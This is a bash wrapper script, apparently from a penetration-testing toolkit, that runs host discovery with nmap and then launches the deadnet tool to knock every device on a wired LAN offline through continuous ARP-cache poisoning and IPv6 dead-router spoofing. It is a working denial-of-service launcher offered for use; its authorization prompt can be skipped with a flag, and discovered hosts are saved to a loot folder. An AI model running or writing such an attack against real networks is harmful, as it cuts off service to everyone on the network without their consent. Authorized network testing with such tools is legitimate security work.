#!/bin/bash
# deadnet.sh - Disconnect devices on the wired LAN via ARP-cache poisoning +
# IPv6 dead-router spoofing (powered by deadnet, trimmed down from
# https://github.com/flashnuke/deadnet - just the ~30KB core tool, not its
# unrelated 71MB bundled Android app). For when you're ALREADY ON the
# network - different tool/trust model than deauth.sh, which is for WiFi
# clients you're NOT connected to.
#
# This is the ONE place that actually runs deadnet - the deadnet_lan_kill
# payload and the GUI both call this same script with the same arguments,
# so behavior is identical no matter how you launch it.
#
# Runs continuously until you press Ctrl+C - it does not stop on its own.
# If started in the background (GUI/PayloadRunner --background), use
# `deadnet.sh --stop` instead.
#
# IMPORTANT: only run this against a network you are authorized to test.
#
# Usage:
#   deadnet.sh [--iface eth1] [--gateway IP] [--gateway-mac MAC] [--sleep SECONDS]
#   deadnet.sh --discover [--iface eth1]      just scan and list live hosts, don't attack
#   deadnet.sh --stop
#   deadnet.sh --status
#   deadnet.sh                interactive mode
#
# Options:
#   --iface IFACE       Wired interface to attack from (default: eth1)
#   --gateway IP          Gateway IPv4 (default: auto-detected, x.x.x.1)
#   --gateway-mac MAC       Gateway MAC (default: auto-detected via ARP)
#   --sleep SECONDS           Re-poison interval (default: 5)
#   --cidr N                    Subnet size to attack (default: 24)
#   --disable-ipv6                 Skip the IPv6 dead-router-advertisement attack
#   --no-discover                    Skip the pre-attack host discovery scan
#   --discover                         Only discover live hosts, don't attack
#   --stop                                Stop a run that was started in the background
#   --status                                Is a LAN kill currently running?
#   -y, --yes                                Skip the authorization confirmation
#   -h, --help                                 This help
#
# Host discovery: before attacking, this scans the subnet with nmap (a
# quick ping sweep) and shows you exactly which real, live hosts are on
# the LAN and about to be affected - not just "the whole subnet" as an
# abstraction. The underlying deadnet attack still covers the full
# subnet (that's how ARP poisoning works - you can't be selective about
# who receives poisoned ARP replies without a different attack entirely),
# but you now get told upfront who's actually there before you commit,
# and the discovered host list is saved to loot alongside the run.

set -u
TOOL_NAME="deadnet.sh"
LOOT_DIR="/root/loot/deadnet"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/lib/common.sh"
usage() { print_help "$0"; exit 1; }

IFACE="eth1"; GATEWAY=""; GATEWAY_MAC=""; SLEEP_TIME="5"; CIDR="24"; DISABLE_IPV6=0
DO_STOP=0; DO_STATUS=0; DO_DISCOVER_ONLY=0; NO_DISCOVER=0

while [ $# -gt 0 ]; do
    case "$1" in
        --iface) need_arg "--iface" "$#"; IFACE="$2"; shift 2 ;;
        --gateway) need_arg "--gateway" "$#"; GATEWAY="$2"; shift 2 ;;
        --gateway-mac) need_arg "--gateway-mac" "$#"; GATEWAY_MAC="$2"; shift 2 ;;
        --sleep) need_arg "--sleep" "$#"; SLEEP_TIME="$2"; shift 2 ;;
        --cidr) need_arg "--cidr" "$#"; CIDR="$2"; shift 2 ;;
        --disable-ipv6) DISABLE_IPV6=1; shift ;;
        --no-discover) NO_DISCOVER=1; shift ;;
        --discover) DO_DISCOVER_ONLY=1; shift ;;
        --stop) DO_STOP=1; shift ;;
        --status) DO_STATUS=1; shift ;;
        -y|--yes) ASSUME_YES=1; shift ;;
        -h|--help) usage ;;
        *) err "Unknown argument: $1"; usage ;;
    esac
done

is_running() {
    ps w 2>/dev/null | grep 'deadnet\.py' | grep -v grep | awk '{print $1}'
}

if [ "$DO_STATUS" = "1" ]; then
    pids=$(is_running)
    if [ -n "$pids" ]; then
        say "Running (PID(s): $(echo "$pids" | tr '\n' ' '))"
    else
        say "Not running."
    fi
    exit 0
fi

if [ "$DO_STOP" = "1" ]; then
    pids=$(is_running)
    if [ -n "$pids" ]; then
        echo "$pids" | xargs -r kill
        say "Stopped."
    else
        say "Nothing running."
    fi
    exit 0
fi

lan_available() { ip link show "$IFACE" >/dev/null 2>&1 && ip -4 addr show "$IFACE" 2>/dev/null | grep -q "inet "; }

get_subnet() {
    # Reuses the same portable, python3-free CIDR math as LanScan.sh.
    local cidr ip_addr prefix
    cidr=$(ip -4 -o addr show "$IFACE" 2>/dev/null | awk '{print $4}' | head -1)
    [ -z "$cidr" ] && return 1
    ip_addr="${cidr%/*}"
    prefix="${cidr#*/}"
    case "$prefix" in ''|*[!0-9]*) return 1 ;; esac
    awk -v ip="$ip_addr" -v prefix="$prefix" 'BEGIN{
        n = split(ip, o, ".");
        if (n != 4) exit 1;
        ipnum = o[1]*16777216 + o[2]*65536 + o[3]*256 + o[4];
        hostbits = 32 - prefix;
        blocksize = 1;
        for (i = 0; i < hostbits; i++) blocksize = blocksize * 2;
        netnum = int(ipnum / blocksize) * blocksize;
        printf "%d.%d.%d.%d/%d\n", int(netnum/16777216)%256, int(netnum/65536)%256, int(netnum/256)%256, netnum%256, prefix;
    }'
}

discover_hosts() {
    # Quick ping-sweep host discovery. Prints "IP MAC Vendor" lines and
    # returns the live host count via echo count on the last line prefixed
    # with "COUNT:" for the caller to parse, OR just prints for humans when
    # called directly with --discover.
    local subnet
    subnet=$(get_subnet)
    if [ -z "$subnet" ]; then
        err "Could not determine the subnet on $IFACE (no IPv4 address yet)."
        return 1
    fi

    if ! command -v nmap >/dev/null 2>&1; then
        err "nmap not found - skipping host discovery, will attack the whole subnet blind."
        return 1
    fi

    say "Discovering live hosts on $subnet (quick ping sweep)..."
    mkdir -p "$LOOT_DIR"
    local stamp rawfile outfile
    stamp=$(date +%Y%m%d-%H%M%S 2>/dev/null || echo scan)
    rawfile="$LOOT_DIR/discovery-${stamp}-raw.txt"
    outfile="$LOOT_DIR/discovery-${stamp}.txt"

    # Normal (non-grepable) nmap output reliably includes "MAC Address:"
    # lines when it can ARP-resolve one - grepable (-oG) output does not,
    # so parse the normal format instead (same pattern already proven to
    # work against this device's nmap in LanScan.sh). Single pass, flush
    # the previous host's record whenever a new one starts (and at EOF) -
    # easy to verify correct: exactly one line out per host seen, whether
    # or not its MAC resolved.
    nmap -sn -e "$IFACE" "$subnet" > "$rawfile" 2>/dev/null

    awk '
        /^Nmap scan report for/ {
            if (ip != "") print ip "\t" mac
            ip = $NF
            gsub(/[()]/, "", ip)
            mac = "(no MAC resolved)"
            next
        }
        /^MAC Address:/ {
            mac = $3
            for (i = 4; i <= NF; i++) mac = mac " " $i
            next
        }
        END { if (ip != "") print ip "\t" mac }
    ' "$rawfile" > "$outfile"

    local count
    count=$(wc -l < "$outfile" | tr -d ' ')

    if [ "$count" -gt 0 ]; then
        say "Found $count live host(s):"
        cat "$outfile"
    else
        say "No live hosts found (or the scan format changed - see $outfile)."
    fi
    say "Saved to $outfile"
    return 0
}

if [ "$DO_DISCOVER_ONLY" = "1" ]; then
    if ! lan_available; then
        die "$IFACE doesn't look up with an IP - nothing to discover."
    fi
    discover_hosts
    exit 0
fi

deadnet_dir="$SCRIPT_DIR/lib/deadnet"
[ ! -f "$deadnet_dir/deadnet.py" ] && die "deadnet not found at $deadnet_dir - run the toolkit setup.py first."

INTERACTIVE=0
[ "$ASSUME_YES" != "1" ] && INTERACTIVE=1

if [ "$INTERACTIVE" = "1" ]; then
    echo "== deadnet.sh =="
fi

if ! lan_available; then
    err "$IFACE doesn't look up with an IP yet - this will likely fail. Continuing anyway."
elif [ "$NO_DISCOVER" != "1" ]; then
    discover_hosts || true
    echo
fi

if [ "$ASSUME_YES" != "1" ]; then
    say "This ARP-poisons the WHOLE LAN on $IFACE and runs until you press Ctrl+C."
    confirm "Only run this against a network you're authorized to test. Proceed?" || die "Aborted."
fi

py_args=(-i "$IFACE" -m "$CIDR" -s "$SLEEP_TIME")
[ -n "$GATEWAY" ] && py_args+=(-g "$GATEWAY")
[ -n "$GATEWAY_MAC" ] && py_args+=(-M "$GATEWAY_MAC")
[ "$DISABLE_IPV6" = "1" ] && py_args+=(-6)

PY=$(resolve_python3) || die "python3 is not installed. Run: opkg update && opkg install -d mmc python3"
say "Starting (Ctrl+C to stop)..."
# shellcheck disable=SC2086
(cd "$deadnet_dir" && exec $PY deadnet.py "${py_args[@]}")
